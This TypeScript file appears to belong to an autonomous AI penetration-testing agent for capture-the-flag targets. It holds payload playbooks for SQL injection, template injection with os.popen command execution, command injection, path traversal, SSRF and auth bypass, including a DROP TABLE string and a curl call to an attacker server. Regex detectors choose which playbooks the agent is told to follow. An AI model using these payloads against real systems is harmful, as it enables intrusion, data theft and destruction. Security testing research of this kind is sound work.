/**
 * Dynamic vulnerability playbooks — injected AFTER initial reconnaissance,
 * not upfront in the system prompt.
 *
 * CurriculumPT showed +18pp from injecting vuln-type-specific methodology
 * at the right time (around the 30% budget checkpoint).
 *
 * Detection is pure pattern matching on tool result strings — no LLM call.
 */

// ── Playbook definitions ──

export const PLAYBOOKS: Record<string, string> = {
  sqli: `## SQLi Playbook
- Test all input fields with: ' OR 1=1--, " OR ""=", 1; DROP TABLE--
- Check for error-based: ' AND 1=CONVERT(int,@@version)--
- For blind: write Python timing script (see script templates)
- Enumerate: information_schema.tables, columns, then extract flag
- Try UNION SELECT with increasing column count
- Try different SQL dialects: MySQL (SLEEP), PostgreSQL (pg_sleep), SQLite (sqlite_version())
- If WAF blocks quotes, try: 1 OR 1=1, numeric injection without quotes`,

  ssti: `## SSTI Playbook
- Confirm with: {{7*7}}, \${7*7}, <%= 7*7 %>
- Identify engine: {{config}} (Jinja2), #{7*7} (Ruby), {{self}} (Twig)
- Escalate Jinja2: {{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}
- Escalate Django: {% load module %}{% module.dangerous %}
- Try {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
- If blocked, try: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,

  idor: `## IDOR Playbook
- Login with provided/default creds first
- Find any URL with an ID parameter: /api/users/1, /profile?id=1, /edit/1
- Try incrementing/decrementing IDs: 0, 2, 3, 999, admin
- Try changing user identifiers in POST body: user_id, owner_id, account_id
- Check both GET and POST/PUT endpoints for same resource
- Try negative IDs, very large IDs, string values where integers expected
- Check indirect IDOR: change ID in one endpoint, observe result in another`,

  xss: `## XSS Playbook
- Test reflected: <script>alert(1)</script> in all params
- Try event handlers: <img src=x onerror=alert(1)>, <svg onload=alert(1)>
- Try encoding bypasses: URL encoding, double encoding, HTML entities
- For stored XSS: inject in forms that save data, check where it renders
- DOM XSS: check for document.location, innerHTML, eval in client JS
- Use browser tool to confirm — check dialogs array for alert/confirm/prompt
- If angle brackets filtered: " onfocus=alert(1) autofocus="`,

  ssrf: `## SSRF Playbook
- Test URL/webhook/callback inputs with: http://127.0.0.1, http://localhost
- Try cloud metadata: http://169.254.169.254/latest/meta-data/
- Try URL schemes: file:///etc/passwd, gopher://, dict://
- Try DNS rebinding: use your own domain or 0.0.0.0
- Bypass filters: use decimal IP (2130706433), IPv6 (::1), URL encoding
- Check for partial SSRF: can you control part of the URL?`,

  lfi: `## LFI / Path Traversal Playbook
- Test with: ../../../etc/passwd, ....//....//etc/passwd
- Try encoding: %2e%2e%2f, ..%252f, %c0%ae%c0%ae/
- Try null byte (legacy): ../../../etc/passwd%00.jpg
- Common targets: /etc/passwd, /flag, /flag.txt, /app/flag, /proc/self/environ
- If PHP: try php://filter/convert.base64-encode/resource=index.php
- Try absolute paths: /etc/passwd (no traversal needed if no prefix)`,

  auth_bypass: `## Auth Bypass Playbook
- Try accessing protected endpoints without auth headers/cookies
- Test default creds: admin/admin, admin/password, root/root, test/test
- JWT attacks: algorithm none, weak secret (try "secret", "password"), expired token
- SQL injection in login: admin' --, ' OR 1=1 --
- NoSQL injection: username[$ne]=x&password[$ne]=x
- Check for CORS misconfig allowing credential theft
- Try parameter pollution: add role=admin, is_admin=true to registration/profile update`,

  command_injection: `## Command Injection Playbook
- Test with: ; id, | id, \`id\`, $(id)
- Try chaining: ; cat /flag*, | cat /flag.txt, \`cat /flag\`
- If spaces blocked: use $IFS, {cat,/flag}, tab characters
- If semicolons blocked: try || id, && id, newline injection (%0a)
- Find and read flags: ; find / -name 'flag*' 2>/dev/null
- Check env vars: ; env | grep -i flag
- Try out-of-band: ; curl http://your-server/$(whoami)`,
};

// ── Vuln type indicators — pattern-match on tool result strings ──

interface VulnIndicator {
  /** Vuln type key into PLAYBOOKS */
  type: string;
  /** Regex patterns to match against tool result text */
  patterns: RegExp[];
}

const INDICATORS: VulnIndicator[] = [
  {
    type: "sqli",
    patterns: [
      /SQL syntax/i,
      /mysql_fetch/i,
      /sqlite3?\./i,
      /pg_query/i,
      /ORA-\d{5}/i,
      /ODBC SQL Server/i,
      /unclosed quotation mark/i,
      /syntax error.*near/i,
      /sql.*error/i,
      /database.*error/i,
      /SELECT\s+.*FROM\s+/i,
      /information_schema/i,
      /UNION\s+SELECT/i,
    ],
  },
  {
    type: "ssti",
    patterns: [
      /\{\{.*\}\}/,
      /\$\{.*\}/,
      /<%=.*%>/,
      /jinja/i,
      /mako/i,
      /twig/i,
      /freemarker/i,
      /thymeleaf/i,
      /template.*engine/i,
      /\b49\b/, // result of {{7*7}}
    ],
  },
  {
    type: "idor",
    patterns: [
      /\/api\/users?\/\d+/i,
      /\/profile\?id=/i,
      /\/user\/\d+/i,
      /\/account\/\d+/i,
      /\/edit\/\d+/i,
      /\/order\/\d+/i,
      /user_id/i,
      /owner_id/i,
      /account_id/i,
    ],
  },
  {
    type: "xss",
    patterns: [
      /<script/i,
      /onerror\s*=/i,
      /onload\s*=/i,
      /javascript:/i,
      /document\.cookie/i,
      /innerHTML/i,
      /reflected.*input/i,
      /Content-Type:.*text\/html/i,
    ],
  },
  {
    type: "ssrf",
    patterns: [
      /url[=:]\s*http/i,
      /webhook/i,
      /callback.*url/i,
      /fetch.*url/i,
      /proxy/i,
      /redirect.*url/i,
      /169\.254\.169\.254/,
      /metadata/i,
    ],
  },
  {
    type: "lfi",
    patterns: [
      /file[=:]/i,
      /path[=:]/i,
      /include[=:]/i,
      /template[=:]/i,
      /\.\.\/\.\.\//,
      /etc\/passwd/i,
      /\/proc\/self/i,
      /root:x:0:0/,
      /\[boot loader\]/i,
    ],
  },
  {
    type: "auth_bypass",
    patterns: [
      /login/i,
      /sign.?in/i,
      /auth/i,
      /password/i,
      /session/i,
      /jwt/i,
      /bearer/i,
      /unauthorized/i,
      /403/,
      /401/,
    ],
  },
  {
    type: "command_injection",
    patterns: [
      /exec\s*\(/i,
      /system\s*\(/i,
      /popen\s*\(/i,
      /subprocess/i,
      /child_process/i,
      /shell.*true/i,
      /ping\s/i,
      /nslookup/i,
      /traceroute/i,
    ],
  },
];

/**
 * Scan recent tool result text and return matching playbook types.
 * Returns at most 3 playbooks to avoid prompt bloat.
 */
export function detectPlaybooks(toolResultTexts: string[]): string[] {
  const combined = toolResultTexts.join("\n");
  const scores = new Map<string, number>();

  for (const indicator of INDICATORS) {
    let matchCount = 0;
    for (const pattern of indicator.patterns) {
      if (pattern.test(combined)) {
        matchCount++;
      }
    }
    if (matchCount >= 2) {
      scores.set(indicator.type, matchCount);
    }
  }

  // Sort by match count descending, take top 3
  return [...scores.entries()]
    .sort((a, b) => b[1] - a[1])
    .slice(0, 3)
    .map(([type]) => type);
}

/**
 * Build the playbook injection text for the given vuln types.
 */
export function buildPlaybookInjection(types: string[]): string {
  const sections = types
    .map((t) => PLAYBOOKS[t])
    .filter(Boolean);

  if (sections.length === 0) return "";

  return [
    "## Dynamic Playbook Injection",
    "",
    "Based on reconnaissance so far, these vulnerability-specific methodologies apply.",
    "Follow the steps below — they are tuned for the patterns detected in this target.",
    "",
    ...sections,
  ].join("\n");
}
